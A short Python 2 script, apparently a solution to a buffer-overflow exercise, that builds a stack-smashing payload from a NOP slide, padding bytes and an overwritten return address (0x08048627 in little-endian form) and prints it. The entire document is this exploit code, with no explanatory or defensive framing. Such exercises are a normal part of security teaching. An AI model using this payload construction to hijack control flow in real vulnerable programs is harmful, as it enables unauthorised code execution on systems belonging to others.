## Total payload length
payload_length = 36

## Amount of nops
nop_length = 10

## Controlled memory address to return to in Little Endian format
## 0x08048627
return_address = '\x27\x86\x04\x08'

## Building the nop slide
nop_slide = "\x90" * nop_length

## Building the padding between buffer overflow start and return address
padding = 'B' * (payload_length - nop_length)

print nop_slide + padding + return_address
